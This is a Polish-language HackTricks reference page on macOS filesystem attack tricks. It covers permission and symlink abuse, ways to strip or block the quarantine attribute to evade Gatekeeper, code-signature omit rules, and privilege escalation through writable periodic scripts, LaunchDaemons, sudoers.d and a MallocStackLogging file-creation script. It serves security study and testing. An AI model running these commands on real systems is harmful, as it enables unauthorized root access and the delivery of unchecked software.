# Triki systemowe macOS

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Kombinacje uprawnień POSIX

Uprawnienia w **katalogu**:

* **odczyt** - możesz **wyświetlać** wpisy katalogu
* **zapis** - możesz **usunąć/pisać** **pliki** w katalogu oraz **usunąć puste foldery**.
* Ale nie możesz **usunąć/modyfikować niepustych folderów** chyba że masz uprawnienia do zapisu nad nimi.
* Nie możesz zmienić nazwy folderu, chyba że jesteś jego właścicielem.
* **wykonanie** - masz **prawo do przeglądania** katalogu - jeśli nie masz tego prawa, nie możesz uzyskać dostępu do żadnych plików wewnątrz niego ani w żadnych podkatalogach.

### Niebezpieczne kombinacje

**Jak nadpisać plik/folder należący do roota**, ale:

* Jeden właściciel **katalogu nadrzędnego** w ścieżce to użytkownik
* Jeden właściciel **katalogu nadrzędnego** w ścieżce to **grupa użytkowników** z **uprawnieniami do zapisu**
* Grupa użytkowników ma **uprawnienia do zapisu** do **pliku**

Z dowolną z powyższych kombinacji atakujący mógłby **wstrzyknąć** **link symboliczny/link twardy** do oczekiwanej ścieżki, aby uzyskać uprzywilejowany dowolny zapis.

### Specjalny przypadek R+X katalogu nadrzędnego

Jeśli w **katalogu** są pliki, do których **tylko root ma dostęp do R+X**, to nie są one dostępne dla nikogo innego. Więc podatność pozwalająca na **przeniesienie pliku czytanego przez użytkownika**, który nie może go odczytać z powodu tej **restrykcji**, z tego katalogu **do innego**, może być wykorzystana do odczytania tych plików.

Przykład w: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Link symboliczny / Link twardy

Jeśli uprzywilejowany proces zapisuje dane w **pliku**, który może być **kontrolowany** przez **mniej uprzywilejowanego użytkownika**, lub który mógł być **wcześniej utworzony** przez mniej uprzywilejowanego użytkownika. Użytkownik mógłby po prostu **skierować go do innego pliku** za pomocą linku symbolicznego lub twardego, a uprzywilejowany proces zapisze w tym pliku.

Sprawdź w innych sekcjach, gdzie atakujący mógłby **wykorzystać dowolny zapis do eskalacji uprawnień**.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub binaria, więc gdy są otwierane, aplikacja/binarny zostanie uruchomiony.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dowolny FD

Jeśli możesz sprawić, że **proces otworzy plik lub folder z wysokimi uprawnieniami**, możesz nadużyć **`crontab`**, aby otworzyć plik w `/etc/sudoers.d` z **`EDITOR=exploit.py`**, dzięki czemu `exploit.py` uzyska dostęp do FD pliku wewnątrz `/etc/sudoers` i go nadużyje.

Na przykład: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Unikanie sztuczek z atrybutami xattrs kwarantanny

### Usuń to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Flaga uchg / uchange / uimmutable

Jeśli plik/folder ma ten atrybut niemożliwe będzie dodanie xattr do niego.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montowanie defvfs

Montowanie **devfs** **nie obsługuje xattr**, więcej informacji znajdziesz w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ta ACL zapobiega dodawaniu `xattrs` do pliku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format pliku **AppleDouble** kopiuje plik wraz z jego ACE.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że reprezentacja tekstu ACL przechowywana wewnątrz xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w zdekompresowanym pliku. Dlatego jeśli spakowano aplikację do pliku zip w formacie **AppleDouble** z ACL uniemożliwiającym zapisywanie innych xattr... xattr kwarantanny nie został ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.

Aby odtworzyć to, najpierw musimy uzyskać poprawny ciąg acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Nie jest to naprawdę konieczne, ale zostawiam to tutaj na wszelki wypadek:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Ominięcie podpisów kodu

Paczki zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **skrót** każdego pojedynczego **pliku** w **paczce**. Należy zauważyć, że skrót CodeResources jest również **osadzony w pliku wykonywalnym**, więc nie możemy tego zmienić.

Jednak istnieją pewne pliki, których sygnatura nie będzie sprawdzana, posiadają one klucz omit w pliku plist, na przykład:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Możliwe jest obliczenie sygnatury zasobu z wiersza poleceń za pomocą:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Zamontuj obrazy dysków

Użytkownik może zamontować niestandardowy obraz dysku dmg nawet na istniejących folderach. Oto jak można utworzyć niestandardowy pakiet dmg z niestandardową zawartością:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Zazwyczaj macOS montuje dysk, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (dostarczaną przez `/usr/libexec/diskarbitrationd`). Jeśli dodamy parametr `-d` do pliku plist LaunchDaemons i zrestartujemy system, zapisze on logi w `/var/log/diskarbitrationd.log`.\
Jednakże możliwe jest użycie narzędzi takich jak `hdik` i `hdiutil` do bezpośredniej komunikacji z rozszerzeniem jądra `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Skrypty sh okresowe

Jeśli twój skrypt może zostać zinterpretowany jako **skrypt powłoki**, możesz nadpisać skrypt powłoki **`/etc/periodic/daily/999.local`**, który zostanie uruchomiony codziennie.

Możesz **symulować** wykonanie tego skryptu za pomocą: **`sudo periodic daily`**

### Daemony

Napisz dowolny **LaunchDaemon** jak **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** z plikiem plist wykonującym dowolny skrypt, na przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Plik sudoers

Jeśli masz **dowolne uprawnienia do zapisu**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`** nadając sobie **uprawnienia sudo**.

### Pliki ścieżki

Plik **`/etc/paths`** jest jednym z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Musisz być rootem, aby go nadpisać, ale jeśli skrypt z **procesu uprzywilejowanego** wykonuje **polecenie bez pełnej ścieżki**, możesz próbować go **przechwycić**, modyfikując ten plik.

Możesz również pisać pliki w **`/etc/paths.d`** aby załadować nowe foldery do zmiennej `PATH`.

## Generowanie plików z możliwością zapisu jako inne użytkowniki

To spowoduje wygenerowanie pliku należącego do roota, który jest zapisywalny przeze mnie ([**kod stąd**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). To również może działać jako eskalacja uprawnień:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Pamięć współdzielona

**Pamięć współdzielona POSIX** pozwala procesom w systemach operacyjnych zgodnych z POSIX na dostęp do wspólnej przestrzeni pamięci, ułatwiając szybszą komunikację w porównaniu z innymi metodami komunikacji międzyprocesowej. Polega ona na tworzeniu lub otwieraniu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawianiu jego rozmiaru za pomocą `ftruncate()`, a następnie mapowaniu go do przestrzeni adresowej procesu za pomocą `mmap()`. Procesy mogą następnie bezpośrednio czytać z tej przestrzeni pamięci i zapisywać do niej. Aby zarządzać równoczesnym dostępem i zapobiegać korupcji danych, często używane są mechanizmy synchronizacji, takie jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. Ten system jest szczególnie skuteczny w efektywnej, szybkiej komunikacji międzyprocesowej w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do wspólnych danych.

<details>

<summary>Przykład kodu producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Przykład kodu konsumenta</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Zabezpieczone deskryptory macOS

**Zabezpieczone deskryptory macOS** to funkcja bezpieczeństwa wprowadzona w systemie macOS, mająca na celu zwiększenie bezpieczeństwa i niezawodności operacji na **deskryptorach plików** w aplikacjach użytkownika. Te zabezpieczone deskryptory umożliwiają powiązanie określonych ograniczeń lub "strażników" z deskryptorami plików, które są egzekwowane przez jądro systemu.

Ta funkcja jest szczególnie przydatna do zapobiegania pewnym klasom podatności bezpieczeństwa, takim jak **nieautoryzowany dostęp do plików** lub **warunki wyścigu**. Te podatności występują na przykład wtedy, gdy wątek uzyskuje dostęp do deskryptora pliku, dając **innemu podatnemu wątkowi dostęp do niego** lub gdy deskryptor pliku jest **dziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

* `guarded_open_np`: Otwiera FD z ochroną
* `guarded_close_np`: Zamyka go
* `change_fdguard_np`: Zmienia flagi ochrony na deskryptorze (nawet usuwając ochronę strażnika)

## Odnośniki

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
